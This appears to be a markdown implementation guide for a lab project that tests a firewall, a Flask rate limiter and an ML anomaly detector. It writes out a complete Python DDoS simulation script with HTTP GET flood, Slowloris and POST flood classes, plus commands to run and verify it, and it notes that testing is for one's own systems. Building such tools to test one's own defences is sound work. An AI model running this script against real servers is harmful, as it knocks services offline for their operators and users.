# 🎯 Phase 9 Priority 4: DDoS Simulation - Implementation Guide

**Last Updated:** November 11, 2025 (10:00 PM)  
**Current Phase:** Phase 9 - Testing & Payloads  
**Current Step:** Priority 4 - DDoS Simulation Script  
**Status:** Priority 1-3 Complete ✅ | Priority 4 Ready to Implement

---

## 📊 Phase 9 Progress

### ✅ Completed (Priority 1-3)
- **Priority 1:** Normal Traffic Tests ✅ (`test_normal_requests.py`)
- **Priority 2:** Attack Payload Tests ✅ (`test_attack_payloads.py`)
- **Priority 3:** Payload Collections ✅ (6 payload files, 400+ payloads)

### 🎯 Current Task: Priority 4 - DDoS Simulation

---

## 🚀 Priority 4: DDoS Simulation Script

### Overview

Create a comprehensive DDoS simulation script to test:
- **Rate limiting** effectiveness (Flask middleware + Nginx)
- **NGFW response** to high-volume traffic
- **Server resilience** under load
- **ML anomaly detection** for traffic spikes
- **Adaptive blocking** mechanisms

### File to Create

**Path:** `tests/payloads/ddos_script.py`

---

## 📋 Step-by-Step Implementation Guide

### Step 1: Script Structure and Imports

**What to implement:**

```python
"""
DDoS Simulation Script
Generates high-volume traffic to test rate limiting and NGFW response

Attack Types:
1. HTTP Flood - Rapid GET requests
2. Slowloris - Slow HTTP headers
3. POST Flood - Rapid form submissions

Usage:
    python tests/payloads/ddos_script.py --attack http_flood --rate 100 --duration 60
    python tests/payloads/ddos_script.py --attack slowloris --connections 50
    python tests/payloads/ddos_script.py --attack post_flood --rate 50 --duration 30

Options:
    --attack      Attack type (http_flood, slowloris, post_flood)
    --rate        Requests per second (default: 100)
    --duration    Attack duration in seconds (default: 60)
    --connections Number of connections for Slowloris (default: 50)
    --target      Target URL (default: http://127.0.0.1:5000)
    --threads     Number of threads (default: 10)
"""

import requests
import threading
import time
import argparse
import socket
import random
import sys
from datetime import datetime
from collections import defaultdict
```

**Why these imports:**
- `requests` - HTTP requests for flood attacks
- `threading` - Concurrent request generation
- `socket` - Low-level connections for Slowloris
- `argparse` - Command-line argument parsing
- `time` - Timing and delays
- `random` - Randomization for realistic traffic
- `sys` - System operations and exit codes
- `datetime` - Timestamp logging
- `defaultdict` - Statistics tracking

---

### Step 2: Configuration and Constants

**What to implement:**

```python
# Default configuration
DEFAULT_TARGET = "http://127.0.0.1:5000"
DEFAULT_RATE = 100  # requests per second
DEFAULT_DURATION = 60  # seconds
DEFAULT_THREADS = 10
DEFAULT_CONNECTIONS = 50  # for Slowloris

# User agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
]

# Endpoints to target
ENDPOINTS = [
    "/",
    "/about",
    "/help",
    "/stats",
    "/feedback",
    "/login",
]

# Statistics tracking
stats = {
    "requests_sent": 0,
    "requests_successful": 0,
    "requests_failed": 0,
    "requests_blocked": 0,
    "total_response_time": 0.0,
    "status_codes": defaultdict(int),
}

# Control flags
stop_attack = False
```

**Why this configuration:**
- Flexible targeting (local or remote)
- Realistic user agent rotation
- Multiple endpoint targets
- Comprehensive statistics tracking
- Graceful shutdown support

---

### Step 3: HTTP Flood Attack Class

**What to implement:**

```python
class HTTPFlood:
    """
    HTTP Flood Attack
    Sends rapid GET requests to overwhelm the server
    """
    
    def __init__(self, target, rate, duration, threads):
        self.target = target
        self.rate = rate
        self.duration = duration
        self.threads = threads
        self.requests_per_thread = rate // threads
        self.delay = 1.0 / self.requests_per_thread if self.requests_per_thread > 0 else 0
    
    def send_request(self):
        """Send a single HTTP GET request"""
        global stats, stop_attack
        
        try:
            endpoint = random.choice(ENDPOINTS)
            url = f"{self.target}{endpoint}"
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            
            start_time = time.time()
            response = requests.get(url, headers=headers, timeout=5)
            response_time = time.time() - start_time
            
            # Update statistics
            stats["requests_sent"] += 1
            stats["total_response_time"] += response_time
            stats["status_codes"][response.status_code] += 1
            
            if response.status_code == 200:
                stats["requests_successful"] += 1
            elif response.status_code == 429:  # Rate limited
                stats["requests_blocked"] += 1
            else:
                stats["requests_failed"] += 1
                
        except requests.exceptions.Timeout:
            stats["requests_sent"] += 1
            stats["requests_failed"] += 1
        except Exception as e:
            stats["requests_sent"] += 1
            stats["requests_failed"] += 1
    
    def worker(self):
        """Worker thread that sends requests continuously"""
        global stop_attack
        
        end_time = time.time() + self.duration
        
        while time.time() < end_time and not stop_attack:
            self.send_request()
            if self.delay > 0:
                time.sleep(self.delay)
    
    def execute(self):
        """Execute HTTP flood attack"""
        print(f"\n[HTTP FLOOD] Starting attack...")
        print(f"Target: {self.target}")
        print(f"Rate: {self.rate} req/sec")
        print(f"Duration: {self.duration} seconds")
        print(f"Threads: {self.threads}")
        print(f"Requests per thread: {self.requests_per_thread}")
        print("-" * 60)
        
        # Start worker threads
        threads = []
        start_time = time.time()
        
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor progress
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                print(f"[{elapsed}s] Sent: {stats['requests_sent']} | "
                      f"Success: {stats['requests_successful']} | "
                      f"Blocked: {stats['requests_blocked']} | "
                      f"Failed: {stats['requests_failed']}", end="\r")
        except KeyboardInterrupt:
            print("\n\n[!] Attack interrupted by user")
            global stop_attack
            stop_attack = True
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=5)
        
        print("\n" + "-" * 60)
        print("[HTTP FLOOD] Attack completed")
```

**Key features:**
- Multi-threaded request generation
- Configurable request rate
- Random endpoint selection
- User agent rotation
- Real-time statistics
- Graceful shutdown
- Timeout handling

---

### Step 4: Slowloris Attack Class

**What to implement:**

```python
class Slowloris:
    """
    Slowloris Attack
    Opens many connections and sends partial HTTP headers slowly
    to exhaust server connection pool
    """
    
    def __init__(self, target, connections, duration):
        self.target = target
        self.connections = connections
        self.duration = duration
        self.sockets = []
        
        # Parse target URL
        if target.startswith("http://"):
            self.host = target.replace("http://", "").split(":")[0]
            self.port = int(target.split(":")[-1].split("/")[0]) if ":" in target.replace("http://", "") else 80
        else:
            self.host = target.split(":")[0]
            self.port = int(target.split(":")[1]) if ":" in target else 80
    
    def create_socket(self):
        """Create a socket connection"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))
            
            # Send initial HTTP request (incomplete)
            s.send(f"GET / HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {self.host}\r\n".encode("utf-8"))
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode("utf-8"))
            
            return s
        except Exception as e:
            return None
    
    def execute(self):
        """Execute Slowloris attack"""
        global stop_attack
        
        print(f"\n[SLOWLORIS] Starting attack...")
        print(f"Target: {self.host}:{self.port}")
        print(f"Connections: {self.connections}")
        print(f"Duration: {self.duration} seconds")
        print("-" * 60)
        
        # Create initial connections
        print("[*] Creating initial connections...")
        for i in range(self.connections):
            s = self.create_socket()
            if s:
                self.sockets.append(s)
            if (i + 1) % 10 == 0:
                print(f"[*] Created {i + 1}/{self.connections} connections", end="\r")
        
        print(f"\n[*] Active connections: {len(self.sockets)}")
        print("[*] Keeping connections alive...")
        
        # Keep connections alive
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration and not stop_attack:
                # Send keep-alive headers
                for s in list(self.sockets):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    except:
                        self.sockets.remove(s)
                
                # Replace dead connections
                while len(self.sockets) < self.connections:
                    new_socket = self.create_socket()
                    if new_socket:
                        self.sockets.append(new_socket)
                
                elapsed = int(time.time() - start_time)
                print(f"[{elapsed}s] Active connections: {len(self.sockets)}", end="\r")
                
                time.sleep(10)  # Send keep-alive every 10 seconds
                
        except KeyboardInterrupt:
            print("\n\n[!] Attack interrupted by user")
            stop_attack = True
        
        # Close all connections
        print("\n[*] Closing connections...")
        for s in self.sockets:
            try:
                s.close()
            except:
                pass
        
        print("-" * 60)
        print("[SLOWLORIS] Attack completed")
```

**Key features:**
- Low-level socket connections
- Partial HTTP headers
- Connection keep-alive
- Automatic reconnection
- Resource exhaustion technique

---

### Step 5: POST Flood Attack Class

**What to implement:**

```python
class POSTFlood:
    """
    POST Flood Attack
    Sends rapid POST requests with large payloads
    """
    
    def __init__(self, target, rate, duration, threads):
        self.target = target
        self.rate = rate
        self.duration = duration
        self.threads = threads
        self.requests_per_thread = rate // threads
        self.delay = 1.0 / self.requests_per_thread if self.requests_per_thread > 0 else 0
    
    def send_request(self):
        """Send a single HTTP POST request"""
        global stats, stop_attack
        
        try:
            # Target POST endpoints
            endpoints = ["/feedback", "/login", "/register", "/api/xml"]
            endpoint = random.choice(endpoints)
            url = f"{self.target}{endpoint}"
            
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            # Generate large payload
            payload = {
                "name": "A" * 1000,
                "message": "B" * 5000,
                "data": "C" * 10000,
            }
            
            start_time = time.time()
            response = requests.post(url, data=payload, headers=headers, timeout=5)
            response_time = time.time() - start_time
            
            # Update statistics
            stats["requests_sent"] += 1
            stats["total_response_time"] += response_time
            stats["status_codes"][response.status_code] += 1
            
            if response.status_code == 200:
                stats["requests_successful"] += 1
            elif response.status_code == 429:
                stats["requests_blocked"] += 1
            else:
                stats["requests_failed"] += 1
                
        except requests.exceptions.Timeout:
            stats["requests_sent"] += 1
            stats["requests_failed"] += 1
        except Exception as e:
            stats["requests_sent"] += 1
            stats["requests_failed"] += 1
    
    def worker(self):
        """Worker thread that sends POST requests continuously"""
        global stop_attack
        
        end_time = time.time() + self.duration
        
        while time.time() < end_time and not stop_attack:
            self.send_request()
            if self.delay > 0:
                time.sleep(self.delay)
    
    def execute(self):
        """Execute POST flood attack"""
        print(f"\n[POST FLOOD] Starting attack...")
        print(f"Target: {self.target}")
        print(f"Rate: {self.rate} req/sec")
        print(f"Duration: {self.duration} seconds")
        print(f"Threads: {self.threads}")
        print("-" * 60)
        
        # Start worker threads
        threads = []
        start_time = time.time()
        
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor progress
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                print(f"[{elapsed}s] Sent: {stats['requests_sent']} | "
                      f"Success: {stats['requests_successful']} | "
                      f"Blocked: {stats['requests_blocked']} | "
                      f"Failed: {stats['requests_failed']}", end="\r")
        except KeyboardInterrupt:
            print("\n\n[!] Attack interrupted by user")
            global stop_attack
            stop_attack = True
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=5)
        
        print("\n" + "-" * 60)
        print("[POST FLOOD] Attack completed")
```

**Key features:**
- Large payload generation
- POST endpoint targeting
- Multi-threaded execution
- Real-time monitoring

---

### Step 6: Statistics and Reporting

**What to implement:**

```python
def print_statistics():
    """Print attack statistics"""
    print("\n" + "=" * 60)
    print("ATTACK STATISTICS")
    print("=" * 60)
    
    print(f"Total Requests Sent:    {stats['requests_sent']}")
    print(f"Successful (200):       {stats['requests_successful']}")
    print(f"Blocked (429):          {stats['requests_blocked']}")
    print(f"Failed/Timeout:         {stats['requests_failed']}")
    
    if stats['requests_sent'] > 0:
        success_rate = (stats['requests_successful'] / stats['requests_sent']) * 100
        block_rate = (stats['requests_blocked'] / stats['requests_sent']) * 100
        print(f"\nSuccess Rate:           {success_rate:.2f}%")
        print(f"Block Rate:             {block_rate:.2f}%")
    
    if stats['requests_successful'] > 0:
        avg_response_time = (stats['total_response_time'] / stats['requests_successful']) * 1000
        print(f"Avg Response Time:      {avg_response_time:.2f}ms")
    
    print("\nStatus Code Breakdown:")
    for code, count in sorted(stats['status_codes'].items()):
        print(f"  {code}: {count}")
    
    print("=" * 60)
```

---

### Step 7: Main Function and CLI

**What to implement:**

```python
def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="DDoS Simulation Script")
    parser.add_argument("--attack", choices=["http_flood", "slowloris", "post_flood"],
                        required=True, help="Attack type")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target URL")
    parser.add_argument("--rate", type=int, default=DEFAULT_RATE,
                        help="Requests per second (for flood attacks)")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION,
                        help="Attack duration in seconds")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                        help="Number of threads (for flood attacks)")
    parser.add_argument("--connections", type=int, default=DEFAULT_CONNECTIONS,
                        help="Number of connections (for Slowloris)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("DDOS SIMULATION SCRIPT")
    print("=" * 60)
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Attack Type: {args.attack.upper()}")
    
    try:
        if args.attack == "http_flood":
            attack = HTTPFlood(args.target, args.rate, args.duration, args.threads)
            attack.execute()
            print_statistics()
            
        elif args.attack == "slowloris":
            attack = Slowloris(args.target, args.connections, args.duration)
            attack.execute()
            
        elif args.attack == "post_flood":
            attack = POSTFlood(args.target, args.rate, args.duration, args.threads)
            attack.execute()
            print_statistics()
    
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

---

## 🧪 Testing Instructions

### Test 1: HTTP Flood (Low Intensity)
```bash
python tests/payloads/ddos_script.py --attack http_flood --rate 10 --duration 30
```

**Expected:**
- 300 requests sent (10 req/sec × 30 sec)
- Most requests successful (200)
- Some may be rate limited (429)

### Test 2: HTTP Flood (High Intensity)
```bash
python tests/payloads/ddos_script.py --attack http_flood --rate 200 --duration 60
```

**Expected:**
- 12,000 requests sent
- Many requests blocked by rate limiter
- Server remains responsive

### Test 3: Slowloris
```bash
python tests/payloads/ddos_script.py --attack slowloris --connections 50 --duration 60
```

**Expected:**
- 50 connections opened
- Connections kept alive for 60 seconds
- Server connection pool may be exhausted

### Test 4: POST Flood
```bash
python tests/payloads/ddos_script.py --attack post_flood --rate 50 --duration 30
```

**Expected:**
- 1,500 POST requests with large payloads
- Higher server load than GET requests
- Rate limiting triggered

---

## 📊 Success Criteria

- [ ] Script runs without errors
- [ ] HTTP flood generates configurable request rate
- [ ] Slowloris opens and maintains connections
- [ ] POST flood sends large payloads
- [ ] Statistics are accurate
- [ ] Rate limiting is triggered
- [ ] Server remains responsive (doesn't crash)
- [ ] NGFW logs show traffic spike
- [ ] ML model detects anomaly

---

## 🔍 Verification Steps

### 1. Check Flask Rate Limiter
```bash
# Should see rate limit messages in Flask logs
tail -f logs/app.log | grep "rate limit"
```

### 2. Check Server Resources
```bash
# Monitor CPU and memory during attack
top
htop
```

### 3. Check NGFW Detection (if integrated)
```bash
# On VM1, check Suricata alerts
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
```

### 4. Check Blocked IPs
```bash
# On VM1, check if attacker IP was blocked
sudo nft list set inet firewall blocked_ips
```

---

## ⚠️ Important Notes

### Safety Considerations
- **Only test on your own systems**
- **Start with low intensity** (rate 10-50)
- **Monitor server health** during tests
- **Have a kill switch** (Ctrl+C)
- **Test locally first** before testing through NGFW

### Rate Limiting Behavior
- Flask middleware: 100 req/min per user
- Global limit: 50 req/sec
- Nginx (if configured): Additional limits
- Expect 429 status codes when limits hit

### Expected Impact
- **Low intensity (10-50 req/sec):** Minimal impact
- **Medium intensity (100-200 req/sec):** Rate limiting triggered
- **High intensity (500+ req/sec):** Server may slow down
- **Slowloris:** Connection pool exhaustion

---

## 🎯 Next Steps After Implementation

1. **Test Locally**
   - Run all three attack types
   - Verify statistics are accurate
   - Confirm rate limiting works

2. **Test Through NGFW**
   - Update target to VM2 IP
   - Run attacks from external machine
   - Verify NGFW detection

3. **Analyze Results**
   - Check Suricata alerts
   - Review ML model predictions
   - Verify adaptive blocking

4. **Document Findings**
   - Attack success rates
   - Detection accuracy
   - Server resilience
   - Recommendations

---

**Ready to implement Priority 4!** Follow the steps above to create the DDoS simulation script.
